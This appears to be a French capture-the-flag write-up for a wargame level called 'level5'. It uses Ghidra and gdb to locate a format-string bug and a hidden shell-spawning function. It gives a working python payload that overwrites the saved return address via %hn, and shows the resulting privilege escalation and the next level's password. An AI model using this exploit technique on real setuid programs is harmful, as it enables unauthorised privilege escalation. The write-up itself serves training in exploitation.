# level5

On décompile l'exécutable du répertoire avec ghidra.

On constate le meme style de faille, à savoir, "format string".
Cette fois-ci une fonction qui n'est pas appelé dans le programme parent, lance un shell.
Nous savons qu'il faut donc rediriger le programme vers cette fonction.

Nous avons donc besoin des adresses suivantes :
- l'adresse de la fonction "o"
- l'emplacement de la stack frame pour injecter notre code (faille printf)
- l'adresse pour rediriger le programme grace a la faille de printf

lançons gdb
```
(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	sub    $0x18,%esp
   0x080484aa <+6>:	movl   $0x80485f0,(%esp)
   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
   0x080484b6 <+18>:	movl   $0x1,(%esp)
   0x080484bd <+25>:	call   0x8048390 <_exit@plt>
End of assembler dump.
```
L'adresse de la fonction "o" est "0x080484a4"

```
Starting program: /home/user/level5/level5
AAAA%x %x %x %x %x %x %x
AAAA200 b7fd1ac0 b7ff37d0 41414141 25207825 78252078 20782520
[Inferior 1 (process 8892) exited with code 01]
```
L'endroit où nous pouvons agir sur le code est %4$x (4e stack frame).
```
(gdb) disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:	push   %ebp
   0x080484c3 <+1>:	mov    %esp,%ebp
   0x080484c5 <+3>:	sub    $0x218,%esp
   0x080484cb <+9>:	mov    0x8049848,%eax
   0x080484d0 <+14>:	mov    %eax,0x8(%esp)
   0x080484d4 <+18>:	movl   $0x200,0x4(%esp)
   0x080484dc <+26>:	lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:	mov    %eax,(%esp)
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:	lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:	mov    %eax,(%esp)
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
   0x080484f8 <+54>:	movl   $0x1,(%esp)
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
End of assembler dump.
(gdb) b* printf
Breakpoint 1 at 0x8048380

## Nous mettons un breakpoint avant l'appel de printf.

(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level5/level5
%x

Breakpoint 1, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
(gdb) info registers
eax            0xbffff520	-1073744608
ecx            0xb7fda003	-1208115197
edx            0xb7fd28c4	-1208145724
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff50c	0xbffff50c
ebp            0xbffff728	0xbffff728
esi            0x0	0
edi            0x0	0
eip            0xb7e78850	0xb7e78850 <printf>
eflags         0x200296	[ PF AF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51

## Nous avons l'adresse de esp, qui sera mis dans eip plus tard.

(gdb) x/wx $esp
0xbffff50c:	0x080484f8

## esp pointe vers une adresse


(gdb) x/2i 0x080484f8
0x80484f8 <n+54>:	movl   $0x1,(%esp)
0x80484ff <n+61>:	call   0x80483d0 <exit@plt>

## en inspectant nous retrouvons la suite de l'exécution du programme
```

Nous avons allons donc écraser l'adresse "0x080484f8" par l'adresse de la fonction "o" : "0x080484a4".
Et quand le programme arrivera a "0xbffff50c", le code de la fonction o sera executé.

Nous allons écrire cette adresse avec la meme technique que précedemment (%n).
Le problème est que le nombre d'espaces à inséré est conséquent.
"0x080484a4" en décimal = "134513828" - 4 (adresse).


```
python -c 'print("\x0c\xf5\xff\xbf" + "%134513824x" + "%4$hn" )' > /tmp/exploit3
cat /tmp/exploit3 - | /home/user/level5/level5
id
uid=2045(level5) gid=2045(level5) euid=2064(level6) egid=100(users) groups=2064(level6),100(users),2045(level5)
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
